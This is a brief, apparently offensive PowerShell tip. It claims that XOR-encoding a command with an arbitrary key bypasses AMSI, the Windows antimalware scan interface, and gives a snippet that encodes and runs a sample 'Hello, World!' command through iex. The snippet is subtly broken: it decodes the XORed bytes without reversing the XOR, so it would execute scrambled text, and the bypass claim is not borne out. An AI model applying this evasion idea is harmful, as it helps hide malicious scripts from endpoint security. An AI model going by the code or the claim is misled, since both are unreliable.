XOR a string with a certain key to bypass AMSI. 
The key can be any arbitrary value, and the string can be the PowerShell command / script.

```powershell
$script = "Write-Output 'Hello, World!'"
$key = 0x55
$encoded = [System.Text.Encoding]::Unicode.GetBytes($script)
for ($i = 0; $i -lt $encoded.Length; $i++) {
    $encoded[$i] = $encoded[$i] -bxor $key
}
$decoded = [System.Text.Encoding]::Unicode.GetString($encoded)
iex $decoded
```
